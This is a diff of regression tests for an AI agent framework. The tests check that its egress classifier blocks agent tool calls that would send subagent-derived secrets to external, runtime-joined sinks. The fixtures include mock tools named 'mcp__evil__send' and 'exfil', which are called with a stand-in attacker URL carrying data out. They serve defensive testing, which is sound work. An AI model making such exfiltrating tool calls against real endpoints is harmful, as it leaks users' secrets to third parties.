@@ -2028,6 +2028,113 @@ describe("runChatLoop egress matcher (FR-006)", () => {
     expect(egressEvent?.reason).toContain("subagent");
   });
 
+  // Regression — issue #144 (CWE-636). The egress block tier was unreachable
+  // because every sink was hardcoded "external-configured". A runtime-joined
+  // mcp__ sink is now external-dynamic, so non-user content to it BLOCKS.
+  test("an mcp__ sink is external-dynamic, so non-user content is blocked not just warned (#144)", async () => {
+    const matcher: import("@crewhaus/egress-classifier").EgressMatcher = {
+      name: "spy-dynamic",
+      match: () => ({ originsFound: ["subagent"], matchCount: 1 }),
+    };
+    let executed = false;
+    const mcpSink = buildTool({
+      name: "mcp__evil__send",
+      description: "runtime-joined mcp sink",
+      inputSchema: z.object({ url: z.string() }),
+      scope: "external",
+      execute: async () => {
+        executed = true;
+        return "sent";
+      },
+    });
+    const runContext = createRunContext();
+    runContext.dataLineage = new Map<string, import("@crewhaus/run-context").TrustOrigin>([
+      ["secret-from-a-subagent", "subagent"],
+    ]);
+    const seen: import("@crewhaus/trace-event-bus").TraceEvent[] = [];
+    runContext.eventBus.subscribe((e) => {
+      seen.push(e);
+    });
+
+    await runChatLoop({
+      model: "test-model",
+      instructions: "do the task",
+      _adapter: makeExternalToolUseAdapter("toolu_mcp", "mcp__evil__send", {
+        url: "https://attacker.example/?d=x",
+      }),
+      runContext,
+      singleTurn: true,
+      seedMessages: [{ role: "user", content: "go" }],
+      tools: [mcpSink],
+      permissionMode: "bypass",
+      egressMatcher: matcher,
+    });
+
+    const ev = seen.find(
+      (
+        e,
+      ): e is Extract<
+        import("@crewhaus/trace-event-bus").TraceEvent,
+        { kind: "permission_decision" }
+      > =>
+        e.kind === "permission_decision" &&
+        e.toolName === "mcp__evil__send" &&
+        (e.reason?.startsWith("egress:") ?? false),
+    );
+    expect(ev?.outcome).toBe("egress-blocked");
+    expect(executed).toBe(false); // the sink was denied before it fired
+  });
+
+  test("opts.resolveSinkScope can mark a non-mcp sink dynamic to enable the block tier (#144)", async () => {
+    const matcher: import("@crewhaus/egress-classifier").EgressMatcher = {
+      name: "spy-dynamic-2",
+      match: () => ({ originsFound: ["subagent"], matchCount: 1 }),
+    };
+    const exfil = buildTool({
+      name: "exfil",
+      description: "external sink",
+      inputSchema: z.object({ url: z.string() }),
+      scope: "external",
+      execute: async () => "sent",
+    });
+    const runContext = createRunContext();
+    runContext.dataLineage = new Map<string, import("@crewhaus/run-context").TrustOrigin>([
+      ["secret-from-a-subagent", "subagent"],
+    ]);
+    const seen: import("@crewhaus/trace-event-bus").TraceEvent[] = [];
+    runContext.eventBus.subscribe((e) => {
+      seen.push(e);
+    });
+
+    await runChatLoop({
+      model: "test-model",
+      instructions: "do the task",
+      _adapter: makeExternalToolUseAdapter("toolu_dyn", "exfil", {
+        url: "https://attacker.example/?d=x",
+      }),
+      runContext,
+      singleTurn: true,
+      seedMessages: [{ role: "user", content: "go" }],
+      tools: [exfil],
+      permissionMode: "bypass",
+      egressMatcher: matcher,
+      resolveSinkScope: () => "external-dynamic",
+    });
+
+    const ev = seen.find(
+      (
+        e,
+      ): e is Extract<
+        import("@crewhaus/trace-event-bus").TraceEvent,
+        { kind: "permission_decision" }
+      > =>
+        e.kind === "permission_decision" &&
+        e.toolName === "exfil" &&
+        (e.reason?.startsWith("egress:") ?? false),
+    );
+    expect(ev?.outcome).toBe("egress-blocked");
+  });
+
   test("a no-hit matcher result yields egress-passed and the call proceeds", async () => {
     // The injected matcher reports zero hits even though lineage is
     // populated and the substring default WOULD have flagged it — proving
